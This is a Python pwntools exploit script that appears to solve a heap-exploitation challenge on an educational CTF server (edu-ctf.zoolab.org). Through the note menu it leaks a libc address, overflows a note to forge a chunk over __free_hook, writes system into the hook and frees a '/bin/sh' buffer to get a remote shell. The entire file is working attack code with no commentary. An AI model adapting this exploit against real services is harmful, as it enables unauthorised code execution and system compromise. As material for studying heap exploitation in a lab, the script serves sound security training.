from pwn import *

context.arch = "amd64"

r = remote("edu-ctf.zoolab.org", "10007")

def add(index, note_name):
    r.sendafter(b"> ", b"1" + b"\n")
    r.sendafter(b"> ", str(index).encode() + b"\n")
    r.sendafter(b"> ", note_name.encode() + b"\n")
def edit(index, size, msg):
    r.sendafter(b"> ", b"2" + b"\n")
    r.sendafter(b"> ", str(index).encode() + b"\n")
    r.sendafter(b"> ", str(size).encode() + b"\n")
    r.send(msg + b"\n")
def delete(index):
    r.sendafter(b"> ", b"3" + b"\n")
    r.sendafter(b"> ", str(index).encode() + b"\n")
def show():
    r.sendafter(b"> ", b"4" + b"\n")

add(0, 'A' * 0x8)
edit(0, 0x418, b'A')

add(1, 'B' * 0x8)
edit(1, 0x18, b'B')

add(2, 'C' * 0x8)

delete(0)
show()

r.recvuntil(b'data: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
free_hook= libc + 0x1eee48
system = libc + 0x52290
info(f"libc: {hex(libc)}")

arg1 = (hex(free_hook)[2:6])
arg2 = (hex(free_hook)[6:])

# exit(0)

fake_chunk = flat(
    0x0, 0x21,
    b'deadbeef', b'deadbeef',
    free_hook,
)

data = b'/bin/sh\0'.ljust(0x10, b'B')
edit(1, 0x38, data + fake_chunk)

edit(2, 0x8, p64(system))

delete(1)

r.interactive()